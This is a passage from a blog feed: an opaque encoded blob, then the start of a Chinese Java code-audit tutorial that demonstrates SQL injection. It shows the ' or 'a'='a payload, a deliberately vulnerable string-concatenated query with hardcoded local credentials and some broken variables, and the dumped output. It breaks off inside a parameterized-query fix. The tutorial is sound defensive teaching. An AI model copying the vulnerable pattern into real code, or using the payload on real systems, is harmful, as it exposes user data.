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]]></content>
      <categories>
        <category>code audit</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>code audit</tag>
        <tag>java</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[代码审计(Java)]]></title>
    <url>%2F2017%2F12%2F31%2Fcode-audit-java%2F</url>
    <content type="text"><![CDATA[概述由于工作需要，开始接触代码审计的相关工作。因为之前对这方面并没有很清晰的概念，所以特地学习下 Web应用安全的核心问题用户提交的数据不可信是Web应用程序核心安全问题。 SQL注入原理合法输入12id=1SELECT * FROM users WHRER id=&apos;1&apos;; 恶意输入12id=1&apos; or &apos;1&apos;=&apos;1SELECT * FROM users WHRER id=&apos;1&apos; or &apos;a&apos;=&apos;a&apos;; Java代码分析不合规代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667public class SQLInject &#123; public static void main(String[] args)throws Exception&#123; //正常输入 select(&quot;1&quot;); // 恶意输入 select(&quot;&apos; or &apos;a&apos;=&apos;a&quot;); &#125; public static void select(String id)&#123; if (id!=null&amp;&amp;!id.isEmpty())&#123; //声明Connection对象 Connection con; //驱动程序名 String driver = &quot;com.mysql.jdbc.Driver&quot;; //URL指向要访问的数据库名mydata String url = &quot;jdbc:mysql://localhost:3306/test&quot;; //MySQL配置时的用户名 String user = &quot;root&quot;; //MySQL配置时的密码 String password = &quot;123456&quot;; //遍历查询结果集 try &#123; //加载驱动程序 Class&lt;?&gt; aClass = Class.forName(driver); //1.getConnection()方法，连接MySQL数据库！！ con = DriverManager.getConnection(url,user,password); if(!con.isClosed()) &#123; //2.创建statement类对象，用来执行SQL语句！！ Statement statement = con.createStatement(); //要执行的SQL语句 String sql = &quot;select * from users where id=&apos;&quot; + id + &quot;&apos;&quot;; //3.ResultSet类，用来存放获取的结果集！！ ResultSet rs = statement.executeQuery(sql); System.out.println(&quot;-----------------&quot;); System.out.println(&quot;执行Sql语句: &quot;+sql); System.out.println(&quot;执行结果如下所示:&quot;); String name, uname; while (rs.next()) &#123; //获取stuname这列数据 uname = rs.getString(&quot;uname&quot;); //获取stuid这列数据 name = rs.getString(&quot;name&quot;); //输出结果 System.out.println(uname + &quot;\t&quot; + name); res.add(new String[]&#123;&quot;id: &quot;+rs.getString(&quot;id&quot;) + &quot;,uname:&quot;+rs.getString(&quot;uname&quot;) + &quot;,passwd:&quot;+rs.getString(&quot;passwd&quot;) + &quot;,name:&quot;+rs.getString(&quot;name&quot;)&#125; ); &#125; rs.close(); con.close(); &#125; &#125; catch(ClassNotFoundException e) &#123; //数据库驱动类异常处理 e.printStackTrace(); &#125; catch(SQLException e) &#123; //数据库连接失败异常处理 e.printStackTrace(); &#125;catch (Exception e) &#123; e.printStackTrace(); &#125; result.put(&quot;data&quot;,res); result.put(&quot;success&quot;,true); return DataUtil.toJson(result); &#125; &#125;&#125; 123456SQL Paramter:1-----------------执行Sql语句: select * from users where id=&apos;1&apos;执行结果如下所示:test Alice----------------- 12345678SQL Paramter:&apos; or &apos;a&apos;=&apos;a-----------------执行Sql语句:select * from users where id=&apos;1&apos; or &apos;a&apos;=&apos;a&apos;执行结果如下所示:test Aliceadmin Orlevenuser Bob----------------- 合规代码（参数化查询）12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061public class SQLFormat &#123; public static void main(String[] args)throws Exception&#123; select(&quot;1&quot;); select(&quot;&apos; or &apos;a&apos;=&apos;a&quot;); &#125; public static void select(String id)&#123; if (id!=null&amp;&amp;!id.isEmpty())&#123; //声明Connection对象 Connection con; //驱动程序名 String driver = &quot;com.mysql.jdbc.Driver&quot;; //URL指向要访问的数据库名mydata String url = &quot;jdbc:mysql://localhost:3306/test&quot;; //MySQL配置时的用户名 String user = &quot;root&quot;; //MySQL配置时的密码 String password = &quot;123456&quot;; //遍历查询结果集 try &#123; //加载驱动程序 Class&lt;?&gt; aClass = Class.forName(driver); //1.getConnection()方法，连接MySQL数据库！！ con = DriverManager.getConnection(url,user,password); 